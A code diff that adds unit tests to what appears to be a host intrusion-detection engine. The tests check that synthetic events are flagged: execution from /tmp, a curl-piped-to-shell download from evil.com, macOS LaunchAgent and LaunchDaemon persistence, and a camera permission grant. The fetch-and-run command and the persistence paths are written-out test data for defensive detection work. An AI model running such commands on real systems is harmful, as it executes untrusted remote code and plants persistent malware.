@@ -104,3 +104,91 @@ def test_invariants_ssh_key_injection_critical():
 
         assert scored.severity == "CRITICAL"
         assert "UNAUTHORIZED_KEY_ADD" in scored.invariants
+
+
+def test_invariants_suspicious_exec_path():
+    with tempfile.NamedTemporaryFile(suffix=".db") as tmp:
+        baseline = Baseline(tmp.name)
+        engine = InvariantEngine()
+
+        ev = AuthEvent(
+            timestamp=datetime.now().isoformat(),
+            event_type="PROCESS_EXEC",
+            username="mika",
+            process="malware",
+            binary_path="/tmp/malware.sh",
+            command="/tmp/malware.sh --daemon",
+        )
+        scored = engine.evaluate(ev, None, baseline, is_novel=True)
+
+        assert scored.severity == "WARNING"
+        assert "SUSPICIOUS_EXEC_PATH" in scored.invariants
+
+
+def test_invariants_curl_bash_pipe():
+    with tempfile.NamedTemporaryFile(suffix=".db") as tmp:
+        baseline = Baseline(tmp.name)
+        engine = InvariantEngine()
+
+        ev = AuthEvent(
+            timestamp=datetime.now().isoformat(),
+            event_type="PROCESS_EXEC",
+            username="mika",
+            process="sh",
+            command="curl -sSL https://evil.com/payload.sh | sh",
+        )
+        scored = engine.evaluate(ev, None, baseline, is_novel=True)
+
+        assert scored.severity == "CRITICAL"
+        assert "CURL_BASH_EXECUTION" in scored.invariants
+
+
+def test_invariants_persistence_addition():
+    with tempfile.NamedTemporaryFile(suffix=".db") as tmp:
+        baseline = Baseline(tmp.name)
+        engine = InvariantEngine()
+
+        # User level launch agent
+        ev_user = AuthEvent(
+            timestamp=datetime.now().isoformat(),
+            event_type="PERSISTENCE_ADDITION",
+            username="mika",
+            process="persistence",
+            persistence_target="/Users/mika/Library/LaunchAgents/com.evil.plist",
+            command="Added 'com.evil.plist': /tmp/bad",
+        )
+        scored_user = engine.evaluate(ev_user, None, baseline, is_novel=True)
+        assert scored_user.severity == "WARNING"
+        assert "PERSISTENCE_MODIFIED" in scored_user.invariants
+
+        # System level daemon
+        ev_sys = AuthEvent(
+            timestamp=datetime.now().isoformat(),
+            event_type="PERSISTENCE_ADDITION",
+            username="root",
+            process="persistence",
+            persistence_target="/Library/LaunchDaemons/com.evil.root.plist",
+            command="Added root daemon",
+        )
+        scored_sys = engine.evaluate(ev_sys, None, baseline, is_novel=True)
+        assert scored_sys.severity == "CRITICAL"
+        assert "PERSISTENCE_INJECTION" in scored_sys.invariants
+
+
+def test_invariants_sensitive_permission_grant():
+    with tempfile.NamedTemporaryFile(suffix=".db") as tmp:
+        baseline = Baseline(tmp.name)
+        engine = InvariantEngine()
+
+        ev = AuthEvent(
+            timestamp=datetime.now().isoformat(),
+            event_type="PERMISSION_GRANT",
+            username="mika",
+            process="UntrustedApp",
+            permission_service="kTCCServiceCamera",
+        )
+        scored = engine.evaluate(ev, None, baseline, is_novel=True)
+
+        assert scored.severity == "WARNING"
+        assert "SENSITIVE_PERMISSION_GRANT" in scored.invariants
+
